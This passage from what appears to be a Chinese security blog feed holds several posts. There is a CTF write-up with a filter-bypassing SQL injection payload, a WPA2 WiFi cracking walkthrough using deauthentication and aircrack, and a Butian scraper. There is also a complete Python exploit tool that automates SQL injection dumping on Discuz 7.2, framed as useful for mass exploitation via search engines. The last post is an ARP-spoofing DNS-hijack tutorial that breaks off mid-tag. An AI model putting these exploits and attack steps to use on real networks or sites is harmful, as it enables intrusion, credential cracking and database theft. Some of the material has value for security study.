alt="mark"></p><pre><code>PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCiRfR0VUPUFkZF9TKCRfR0VUKTsNCiRfUE9TVD1BZGRfUygkX1BPU1QpOw0KJF9DT09LSUU9QWRkX1MoJF9DT09LSUUpOw0KJF9SRVFVRVNUPUFkZF9TKCRfUkVRVUVTVCk7DQpmdW5jdGlvbiBBZGRfUygkYXJyYXkpDQp7DQpmb3JlYWNoKCRhcnJheSBhcyAka2V5PT4kdmFsdWUpew0KICAgICAgICAgICAgICAgIGlmKCFpc19hcnJheSgkdmFsdWUpKXsNCiAgICAgICAgICAgICAgICAgICAgICAgICRjaGVjaz0gcHJlZ19tYXRjaCgnL3JlZ2V4cHxhbmR8bGlrZXxcInwlfGluc2VydHx1cGRhdGV8ZGVsZXRlfHVuaW9ufGludG98bG9hZF9maWxlfG91dGZpbGV8XC9cKi9pJywgJHZhbHVlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRjaGVjaykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCJIYWNrZXIhIik7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfWVsc2V7DQogICAgICAgICAgICAgICAgICAgICAgICAkYXJyYXlbJGtleV09QWRkX1MoJGFycmF5WyRrZXldKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgIH0NCnJldHVybiAkYXJyYXk7DQp9DQoNCmZ1bmN0aW9uIE1lYXN1cmVtZW50X3VybCgpDQp7DQogICAgJHVybD1wYXJzZV91cmwoJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pOw0KICAgIHBhcnNlX3N0cigkdXJsWydxdWVyeSddLCRxdWVyeSk7DQogICAgJEtleXdvcmQ9YXJyYXkoImZyb20iLCJzZWxlY3QiLCJsaWtlIiwib3IiKTsNCiAgICBmb3JlYWNoKCRxdWVyeSBhcyAka2V5KQ0KICB7DQogICAgICAgIGZvcmVhY2goJEtleXdvcmQgYXMgJHZhbHVlKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZihwcmVnX21hdGNoKCIvIi4kdmFsdWUuIi8iLHN0cnRvbG93ZXIoJGtleSkpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGRpZSgiZnVjayB1ISIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0KPz4NCg==</code></pre><p><strong>base64解码后</strong></p><pre><code>&lt;?phperror_reporting(0);$_GET=Add_S($_GET);$_POST=Add_S($_POST);$_COOKIE=Add_S($_COOKIE);$_REQUEST=Add_S($_REQUEST);function Add_S($array){foreach($array as $key=&gt;$value){            if(!is_array($value)){                    $check= preg_match(&apos;/regexp|and|like|\&quot;|%|insert|update|delete|union|into|load_file|outfile|\/\*/i&apos;, $value);                    if($check)                            {                            exit(&quot;Hacker!&quot;);                    }            }else{                    $array[$key]=Add_S($array[$key]);            }    }return $array;}function Measurement_url(){    $url=parse_url($_SERVER[&apos;REQUEST_URI&apos;]);    parse_str($url[&apos;query&apos;],$query);    $Keyword=array(&quot;from&quot;,&quot;select&quot;,&quot;like&quot;,&quot;or&quot;);    foreach($query as $key)    {    foreach($Keyword as $value)    {        if(preg_match(&quot;/&quot;.$value.&quot;/&quot;,strtolower($key)))        {            die(&quot;fuck u!&quot;);        }    }}}?&gt;</code></pre><p><strong>可以看到其实是写了两个函数分别过滤的，其中<code>ADD_S</code>函数确实是将其里面定义的黑名单sql关键字过滤死了，但是<code>Measurement_url</code>函数中接收url参数值确是通过的<code>parse_url</code>这个函数，之前文章开头也讲到了，使用这个函数取url参数时，会因为url的格式出现一些问题导致该函数返回Flase而绕过过滤，所以我们确定了真正被过滤的关键字只有<code>ADD_S</code>中的那些关键字，而单单过滤这些关键字是不够的，这样我们便通过<code>parse_url</code>函数的漏洞去绕过黑名单的检查，最终读取flag的payload</strong></p><pre><code>http://118.126.113.78///web1/?id=1&apos; ^ 1=extractvalue(1,concat(0x3a,(select password from sql_inject1 limit 3,1),0x3a))--+</code></pre><p><strong>（对select，from的过滤就可以通过parse_url这个函数的漏洞绕过）</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/3Lh2A7BimG.png?imageslim" alt="mark"></p><pre><code>XPATH syntax error: &apos;:flag{WE_ARe_FaMiLy!1234567}:&apos;</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;php-parse-url-函数的漏洞&quot;&gt;&lt;a href=&quot;#php-parse-url-函数的漏洞&quot; class=&quot;headerlink&quot; title=&quot;php parse_url()函数的漏洞&quot;&gt;&lt;/a&gt;php parse_url()函数的漏洞&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;在ctf比赛中经常遇到的一个知识点，记录一下，由于parse_url函数在解析url时存在的bug导致在某些情况下可以绕过正则的过滤&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>kali无线网卡wifi破解</title>
    <link href="http://yoursite.com/2018/04/19/wificrack/"/>
    <id>http://yoursite.com/2018/04/19/wificrack/</id>
    <published>2018-04-19T10:47:50.538Z</published>
    <updated>2018-06-04T15:14:43.532Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kali无线网卡wifi破解"><a href="#kali无线网卡wifi破解" class="headerlink" title="kali无线网卡wifi破解"></a>kali无线网卡wifi破解</h1><h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><p><strong>1.kali2.0操作系统，本人用的32位的，装在vm12虚拟机中</strong></p><p><strong>2.kali所支持的无线网卡，型号为RT3070，淘宝淘来的</strong><br><a id="more"></a></p><h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><p><strong>1.将usb无线网卡连入虚拟机</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/Dmj4eH7lf8.png?imageslim" alt="mark"><br><strong>2.查看无线网卡wlan0是否存在</strong></p><pre><code>iwconfig</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/HEKkcL16ae.png?imageslim" alt="mark"><br><strong>3.开启无线网卡的侦听功能</strong></p><pre><code>airmon-ng start wlan0</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/cBd1C0Fmi2.png?imageslim" alt="mark"><br><strong>如果出现无法侦听数据，先kill一下进程再重新启动一下无线网卡</strong></p><pre><code>airmon-ng check killairmon-ng start wlan0</code></pre><p><strong>4.iwconfig再次查看网卡，看到无线网卡已经变为了wlan0mon，说明无线网卡开启了监听功能</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/LF9m1D86jA.png?imageslim" alt="mark"><br><strong>5.使用无线网卡侦听附近的wifi信号</strong></p><pre><code>airodump-ng wlan0mon</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/j9JD8Ahaj1.png?imageslim" alt="mark"><br><strong>比较重要的几个值，BSSID代表无线网络的唯一标识，也就是路由的MAC地址，CH代表wifi信道，我们攻击的wifi选择了我们实验室的wifi:<code>secevery</code>，可以看到信号还是不错的</strong><br><strong>6.选择要破解的wifi并且抓取握手包</strong></p><pre><code>airodump-ng -c 信道 --bssid BSSID -w 保存文件 wlan0mon</code></pre><p><strong>在这里我们要攻击的BSSID为B0:E1:7E:7D:EA:CC，信道为1</strong></p><pre><code>airodump-ng -c 1 --bssid B0:E1:7E:7D:EA:CC -w secevery wlan0mon</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/88FcA7C3Il.png?imageslim" alt="mark"><br><strong>STATION为wifi下所有设备的MAC地址</strong><br><strong>7.如果抓不到握手包，就要模拟station，模拟其断开，就是踢掉相应的设备，使其重连再抓握手包，10表示发送10个包</strong><br>    airepaly-ng -0 10 -a BSSID -c 你要踢掉的设备的MAC地址 wlan0mon<br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/8Jj860fILB.png?imageslim" alt="mark"><br><strong>如果出现红框里的内容，说明抓到握手包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/Ig4ah756CG.png?imageslim" alt="mark"><br><strong>ls查看可以看到已经抓到握手包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/9m6JIILFFF.png?imageslim" alt="mark"></p><p><strong>8.进行wifi破解，破解成功</strong></p><pre><code>aircrack-ng -a2 -b B0:E1:7E:7D:EA:CC -w passwd.txt secevery-01.cap</code></pre><p><strong>其中a2代表wifi的加密协议为WPA2</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/fIiLEhjmD8.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;kali无线网卡wifi破解&quot;&gt;&lt;a href=&quot;#kali无线网卡wifi破解&quot; class=&quot;headerlink&quot; title=&quot;kali无线网卡wifi破解&quot;&gt;&lt;/a&gt;kali无线网卡wifi破解&lt;/h1&gt;&lt;h3 id=&quot;准备环境&quot;&gt;&lt;a href=&quot;#准备环境&quot; class=&quot;headerlink&quot; title=&quot;准备环境&quot;&gt;&lt;/a&gt;准备环境&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;1.kali2.0操作系统，本人用的32位的，装在vm12虚拟机中&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.kali所支持的无线网卡，型号为RT3070，淘宝淘来的&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="无线安全" scheme="http://yoursite.com/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="wifi破解" scheme="http://yoursite.com/tags/wifi%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>python爬取补天src列表</title>
    <link href="http://yoursite.com/2018/04/17/butianspider/"/>
    <id>http://yoursite.com/2018/04/17/butianspider/</id>
    <published>2018-04-17T09:28:12.804Z</published>
    <updated>2018-06-04T17:21:52.523Z</updated>
    
    <content type="html"><![CDATA[<h1 id="用python爬取补天src列表"><a href="#用python爬取补天src列表" class="headerlink" title="用python爬取补天src列表"></a>用python爬取补天src列表</h1><p><strong>分享一个我写的代码，用python爬取补天src列表，同时可以爬取网站域名和漏洞的提交数和处理数，以公益src为例，贴出我写的代码</strong><br><a id="more"></a></p><pre><code># -*- coding: utf-8 -*-import requestsfrom bs4 import BeautifulSoupurl=&quot;http://loudong.360.cn/Reward/pub&quot;for pnum in range(1,160):    r=requests.post(url=url,data={&apos;s&apos;:1,&apos;p&apos;:pnum}).json()    for info in r[&quot;data&quot;][&quot;list&quot;]:        company_name=info[&quot;company_name&quot;]        company_url=&quot;http://loudong.360.cn/Company/&quot;+info[&quot;company_id&quot;]        html=requests.get(url=company_url).content        soup=BeautifulSoup(html,&quot;lxml&quot;)        num=soup.find_all(class_=&quot;spp&quot;)        print &quot;漏洞数:&quot;,num[0].string,&quot;已处理:&quot;,num[1].string        surl=&quot;http://loudong.360.cn/Loo/submit?cid=&quot;+info[&quot;company_id&quot;]        headers={&quot;Cookie&quot;:&quot;你登陆后的cookie&quot;}        html=requests.get(url=surl,headers=headers).content        soup=BeautifulSoup(html,&quot;lxml&quot;)        site=soup.find(&quot;input&quot;,attrs={&quot;placeholder&quot;:&quot;请输入厂商域名&quot;})[&quot;value&quot;]        print company_name        print site        print u&quot;漏洞数:&quot;, num[0].string, u&quot;已处理:&quot;, num[1].string        print &quot;-------------------------------------------------------------------------------------------------&quot;</code></pre><p><strong>爬取时需要用到的库</strong></p><pre><code>requests库和bs4库</code></pre><p><strong>补天还是十分好爬的，只要分析好每次请求和响应，爬下关键请求的页面，用bs4的BeautifulSoup解析提取数据即可</strong></p><p><strong>关于BeautifulSoup，自己写代码很喜欢用，提取数据很方便，<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/" title="官方文档" target="_blank" rel="external">官方文档</a>写的非常详细</strong></p><p><strong>运行结果</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180417/94aIlf0B6K.png?imageslim" alt="mark"></p><h3 id="分享我写爬虫的一些经验"><a href="#分享我写爬虫的一些经验" class="headerlink" title="分享我写爬虫的一些经验"></a>分享我写爬虫的一些经验</h3><p><strong>最后总结一下我多次写爬虫所总结的经验和方法，爬取网页数据通用的一些方法</strong></p><p><strong>request库常用总结</strong></p><pre><code>html=requests.get(url=url,params={params},headers={headers},cookies={cookies},proxies={proxies}).content用于http GET方法请求的页面，需要提交参数时可以直接在url的?后加参数，也可以将GET请求参数以字典的数据类型赋值给request库get方法中params参数进行提交参数作用:params:字典数据类型，存放http请求的GET参数headers：字典数据类型，里面内容为http的一些请求头，比如Host，User-Agent，主要用来突破一些网站的防爬机制，cookie值也能放到这个里面cookies:字典数据类型,用来存放cookie值proxies：字典数据类型,爬取页面所需要设置的代理，比如爬取谷歌和一些国外网站，因为国内被墙了，搭了ss才能访问，但是直接用python请求页面还是不行，这时候就需要在这里进行设置了，我一般是这样设置的,因为我ss客户端设在了本地1088端口:proxies={&quot;http&quot;:&quot;http://127.0.0.1:1088&quot;,&quot;https&quot;:&quot;https://127.0.0.1:1088&quot;}html=requests.post(url=url,data={data},headers={headers},cookies={cookies},proxies={proxies}).content用于http POST方法请求的页面data:字典数据类型，POST提交的参数headers，cookie，proxies:均和上述的作用一致</code></pre><p><strong>re库常用总结</strong></p><pre><code>p=re.compile(r&quot;编写的正则表达式&quot;)用来编译正则表达式对象并且返回一个正则表达式对象list=p.findall(页面)匹配页面中和正则表达式匹配的数据并且将所有结果以列表的形式返回关于正则表达式，需要多加练习，每个人都有不一样的编写正则方法，只要能将需要的数据精确完整匹配出来的方法都是好方法，特别需要注意贪婪匹配和非贪婪匹配的区别和用法(.*?|.*+)</code></pre><p><strong>bs4库的BeautifulSoup常用总结</strong></p><pre><code>使用BeautifulSoup提取数据，首先要了解html DOM格式:简单来说就是，&lt;标签 属性=&quot;属性值&quot;&gt;文本&lt;/标签&gt;from bs4 import BeautifulSoupsoup=BeautifulSoup(html,&quot;lxml&quot;)返回一个BeautifulSoup对象，我一般比较喜欢用lxml格式解析页面，用多了自然就成习惯了list=soup.find_all(html标签属性=属性值)寻找html所有匹配&quot;html标签属性=属性值&quot;的html标签并以列表的形式返回，列表中每个值的类型均为BeautifulSoup对象for i in list:    i[&quot;属性&quot;]用来提取某一属性下的属性值    i.string用来提取html标签中的文本</code></pre><p><strong>urllib库常用总结</strong></p><pre><code>urllib.urlretrieve(url,filename)urllib库的urlretrieve方法主要用来下载文件，通常将页面爬下来后，用正则表达式或者BeautifulSoup将jpg，png一些图片，xls，doc一些文档，或者mp4等视频连接爬下来后，一般都需要用这个库下载url:资源的链接filename：文件存放的位置，我一般这样写，filename=yourfilepath+url.split(&apos;/&apos;)[-1],比较方便</code></pre><h3 id="我对写爬虫的看法"><a href="#我对写爬虫的看法" class="headerlink" title="我对写爬虫的看法"></a>我对写爬虫的看法</h3><p><strong>以上总结了我写代码的一些方法经验，我对编程的看法是：其实每个人写代码的方式都不太一样，代码写的多了就会有自己的风格。代码主要还是为了解决需求，节省人力，能够将代码用到自己的生活或者工作中，是件很有意思的事情，我觉得写python代码的要点有几个:要多动手写，看官方文档的效率比看书高，编程书是用来查的，百度谷歌很强大</strong></p><h3 id="python爬虫能力对安全人员的作用"><a href="#python爬虫能力对安全人员的作用" class="headerlink" title="python爬虫能力对安全人员的作用"></a>python爬虫能力对安全人员的作用</h3><p><strong>开发简单的漏扫工具，需要爬虫的基础</strong></p><p><strong>根据漏洞编写exp，新爆出的漏洞，exp早写出来可以多刷些漏洞</strong></p><p><strong>利用搜素引擎批量刷漏洞，对于新爆出的漏洞，编写exp后结合搜索引擎的语法寻找网络空间中的漏洞相关组件去测试，整个过程都可以用python爬虫技术自动化完成</strong></p><p><strong>贴出我很久之前学习python时利用python编写的一个自动化利用漏洞的工具代码，选择的漏洞为<a href="https://www.seebug.org/vuldb/ssvid-87114" title="discuz7.2 fap.php注入" target="_blank" rel="external">discuz7.2 faq.php注入</a>漏洞，实现了类似sqlmap的命令行操作</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180417/ifHaEfc52a.png?imageslim" alt="mark"></p><pre><code>#coding=utf-8import requestsimport reimport sysfrom optparse import OptionParserfrom threading import Threaddef main():    parser=OptionParser()    parser.add_option(&quot;-u&quot;,type=&quot;string&quot;,dest=&quot;url&quot;,help=&quot;&quot;)    parser.add_option(&quot;-r&quot;,type=&quot;string&quot;,dest=&quot;filename&quot;,help=&quot;&quot;)    parser.add_option(&quot;-C&quot;,type=&quot;string&quot;,dest=&quot;column&quot;,help=&quot;&quot;)    parser.add_option(&quot;-T&quot;,type=&quot;string&quot;,dest=&quot;table&quot;,help=&quot;&quot;)    parser.add_option(&quot;-D&quot;,type=&quot;string&quot;,dest=&quot;db&quot;,help=&quot;&quot;)    parser.add_option(&quot;--dbs&quot;,action=&quot;store_true&quot;,dest=&quot;dbs&quot;,help=&quot;&quot;)    parser.add_option(&quot;--dump&quot;,action=&quot;store_true&quot;,dest=&quot;dump&quot;,help=&quot;&quot;)    parser.add_option(&quot;--tables&quot;,action=&quot;store_true&quot;,dest=&quot;tables&quot;,help=&quot;&quot;)    parser.add_option(&quot;--columns&quot;,action=&quot;store_true&quot;,dest=&quot;columns&quot;,help=&quot;&quot;)    (options,args)=parser.parse_args()    if options.url and len(sys.argv)==3:        url=options.url        result=testurl(url)        if result:            getinfo(url)        else:            pass    elif options.url and options.dbs:#--dbs        url=options.url        getdbs(url)    elif options.url and options.tables and options.db:#-u url --tables -D database        url=options.url        db=options.db        gettables(url,db)    elif options.url and options.columns and options.table and options.db:#-u url --columns -T table -D database        url=options.url        table=options.table        db=options.db        getcolumns(url,table,db)    elif options.url and options.dump and options.column and options.table and options.db:#-u url --dump  -C column -T table -D database        url=options.url        column=options.column        table=options.table        db=options.db        dumpdata(url,column,table,db)    elif options.filename:        filename=options.filename        testurllist(filename)def testurl(url):    payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;}    content=requests.get(url=url,params=payload)    str=content.text    p=re.compile(r&quot;You have an error in your SQL syntax&quot;)    if re.findall(p,str):        print &quot;this url injectable!&quot;        return True    else:        print &quot;this url not injectable&quot;        return Falsedef testurllist(filename):    try:        file=open(filename,&quot;r&quot;)        urllist=[url.strip() for url in file.readlines()]        for url in urllist:            print &quot;test url..............%s&quot;%(url)            testurl(url)    except IOError,e:        print &quot;file open error&quot;,edef getinfo(url):    payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select database()),0x3a)x from information_schema.tables group by x)a)#&apos;}    content=requests.get(url=url,params=payload)    str=content.text    p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)    c_db=re.findall(p,str).pop()    payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select user()),0x3a)x from information_schema.tables group by x)a)#&apos;}    content=requests.get(url=url,params=payload)    str=content.text    p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)    user=re.findall(p,str).pop()    payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select version()),0x3a)x from information_schema.tables group by x)a)#&apos;}    content=requests.get(url=url,params=payload)    str=content.text    p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)    version=re.findall(p,str).pop()    print &quot;current database:%s\nuser:%s\nversion:%s\n&quot;%(c_db,user,version)def getdbs(url):    i=0    while 1:        payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select schema_name from information_schema.schemata limit %d,1),0x3a)x from information_schema.tables group by x)a)#&apos;%(i)}        content=requests.get(url=url,params=payload)        str=content.text        p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)        dbs=re.findall(p,str)        if dbs==[]:            break        else:            print dbs[-1]            i=i+1def gettables(url,db):    print &quot;select database:%s&quot;%(db)    hexdb=&apos;0x&apos;+db.encode(&quot;hex&quot;)    i=0    while 1:        payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select table_name from information_schema.tables where table_schema=%s limit %d,1),0x3a)x from information_schema.tables group by x)a)#&apos;%(hexdb,i)}        content=requests.get(url=url,params=payload)        str=content.text        p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)        table=re.findall(p,str)        if table==[]:            break        else:            print table[-1]            i=i+1def getcolumns(url,table,db):    print &quot;select database:%s\nselect table:%s&quot;%(db,table)    hextables=[]    hextables.append(&quot;0x&quot;+table.encode(&quot;hex&quot;))    hextables.append(&quot;0x&quot;+(&quot;cdb_&quot;+table).encode(&quot;hex&quot;))    if table.find(&quot;uc_&quot;)==0:        hextables.append(&quot;0x&quot;+(table.split(&quot;_&quot;)[1]).encode(&quot;hex&quot;))    print hextables    for hextable in hextables:        i=0        while 1:            payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select column_name from information_schema.columns where table_name=%s limit %d,1),0x3a)x from information_schema.tables group by x)a)#&apos;%(hextable,i)}            content=requests.get(url=url,params=payload)            str=content.text            p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)            column=re.findall(p,str)            if column==[]:                break            else:                print column[-1]            i=i+1        print idef dumpdata(url,column,table,db):    print &quot;select database:%s\nselect table:%s\nselect column:%s&quot;%(db,table,column)    column=column.replace(&quot;,&quot;,&quot;,0x3a,&quot;)    tables=[]    tables.append(table)    tables.append(&quot;cdb_&quot;+table)    if table.find(&quot;uc_&quot;)&gt;=0:        tables.append(table.split(&quot;_&quot;)[1])    print tables    for table in tables:        i=0        while 1:            payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select concat(%s) from %s.%s limit %d,1),0x3a)x from information_schema.tables group by x)a)#&apos;%(column,db,table,i)}            content=requests.get(url=url,params=payload)            str=content.text            p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)            data=re.findall(p,str)            if data==[]:                break            else:                print data[-1]                i=i+1if __name__==&quot;__main__&quot;:    main()</code></pre><h3 id="官方文档链接"><a href="#官方文档链接" class="headerlink" title="官方文档链接"></a>官方文档链接</h3><p><strong><a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/" title="BeautifulSoup官方文档" target="_blank" rel="external">BeautifulSoup官方文档</a></strong></p><p><strong><a href="http://docs.python-requests.org/zh_CN/latest/" title="requests官方文档" target="_blank" rel="external">requests官方文档</a></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;用python爬取补天src列表&quot;&gt;&lt;a href=&quot;#用python爬取补天src列表&quot; class=&quot;headerlink&quot; title=&quot;用python爬取补天src列表&quot;&gt;&lt;/a&gt;用python爬取补天src列表&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;分享一个我写的代码，用python爬取补天src列表，同时可以爬取网站域名和漏洞的提交数和处理数，以公益src为例，贴出我写的代码&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="python编程" scheme="http://yoursite.com/categories/python%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Ettercap实现局域网dns劫持</title>
    <link href="http://yoursite.com/2018/03/21/dns_spoof/"/>
    <id>http://yoursite.com/2018/03/21/dns_spoof/</id>
    <published>2018-03-21T15:43:32.584Z</published>
    <updated>2018-06-04T14:58:07.193Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ettercap实现局域网dns劫持百度"><a href="#Ettercap实现局域网dns劫持百度" class="headerlink" title="Ettercap实现局域网dns劫持百度"></a>Ettercap实现局域网dns劫持百度</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>很久之前做过的一个实验，利用kali的Ettercap进行局域网的dns劫持，今天实验课老师碰巧又提到了，于是又做了做，这是一个很好玩的实验</strong><br><a id="more"></a></p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p><strong>1.kali2.0操作系统，本人用的32位的，装在vm12虚拟机中，连接自己的RT3070的无线网卡（网卡一定要是kali2.0支持的型号），同时开启apache服务，进行dns劫持</strong></p><p><strong>2.自己的真实机，连接本机电脑的无线网卡</strong></p><p><strong>3.RT3070网卡和本机电脑网卡连接同一wifi，保证kali和自己的PC在同一局域网，用kali对自己的PC进行DNS缓存投毒</strong></p><p><strong>4.用到的软件:kali中的Ettercap，一个集成工具，里面包括了局域网主机扫描，arp欺骗，DNS劫持等功能</strong></p><p><strong>5.浏览器:谷歌浏览器</strong></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>DNS，全称为域名解析协议，是一种将域名解析为ip地址的协议，基于UDP的53端口。比如我们在浏览器访问百度域名，会先向dns服务器发送一次dns请求报文，询问百度的ip地址，dns服务器经过查询（或递归查询）会将百度的域名以及对应的ip地址以dns响应报文的形式发回给我们，然后我们才可以与所对应的ip建立TCP连接进行网络通信。dns劫持建立在arp欺骗的基础上，关于arp的文章之前有写过，链接：<a href="http://lawlietweb.com/2018/01/12/arpattack/" title="arp协议分析&amp;python编程实现arp欺骗抓图片" target="_blank" rel="external">arp协议分析&amp;python编程实现arp欺骗抓图片</a>，通过arp欺骗可以监听受害者机器到网关之间的流量，如果可以过滤协议为UDP，端口为53端口的数据报文，也就是DNS报文，并且将dns响应中的域名所对应的ip地址改写成我们服务器的ip，受害者机器就会与我们的机器进行连接通信，这就是dns投毒的基本原理，kali的Ettercap就可以做到这一点，当然明白了攻击原理，自己编程实现也是可以的，python的scapy库便可以做到，之后有时间会尝试写一下</strong></p><h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><p><strong>1.开启ip转发功能，默认是关闭的</strong></p><pre><code>echo &quot;1&quot;&gt; /proc/sys/net/ipv4/ip_forward</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/510leEijb8.png?imageslim" alt="mark"></p><p><strong>2.查看kali的ip为192.168.0.106，并且修改Ettercap的配置文件，添加一条dns解析记录（A记录）</strong></p><pre><code>* A 192.168.0.106</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/1J1aH0aLj8.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/HDi1m44bg0.png?imageslim" alt="mark"><br><strong>意思是将所有域名都解析到我们kali的ip上</strong></p><p><strong>3.<code>service apache2 start</code>开启apache服务,并在/var/www/html下新建index.html,就是我们攻击后想要看到的效果页面，自己简单写了个有意思的页面，效果如下</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/BkE7FLFB94.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/17EChCh7Jb.png?imageslim" alt="mark"><br><strong>4.准备工作都做好了，接下来使用Ettercap开始我们的攻击,启动Ettercap图形界面</strong></p><pre><code>ettercap -G</code></pre><p><strong>点击Sniff–&gt;Unified sniffing</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/9ADDfJAl0L.png?imageslim" alt="mark"><br><strong>在这选择wlan0无线网卡，因为kali上网使用的是无线网卡，如果虚拟机插网线桥接，这里选eth0</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/LID0a4lc5G.png?imageslim" alt="mark"><br><strong>接下来点击Hosts–&gt;Scan for hosts,扫描局域网中存活的ip，寻找攻击目标</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/dL74JliCG6.png?imageslim" alt="mark"><br><strong>显示扫到5个主机，点击Hosts list查看</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/K322B8ffKI.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/KaHCj7c2HI.png?imageslim" alt="mark"><br><strong>在ip列表里可以看到网关ip192.168.0.1，还有我们的物理机ip192.168.0.103，接下来开始arp欺骗，具体操作将192.168.0.1Add to Target1，将受害PCip192.168.0.103Add to Target2，然后点击Mitm–&gt;ARP poisoning</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/AFd0bJh14I.png?imageslim" alt="mark"><br><strong>勾选第一个</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/L4bIEcmk0f.png?imageslim" alt="mark"><br><strong>ARP欺骗便开始了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/B5B7GA8cl7.png?imageslim" alt="mark"><br><strong>下面开始dns劫持，点击Plugins–&gt;Manage the plugins</strong><br><img 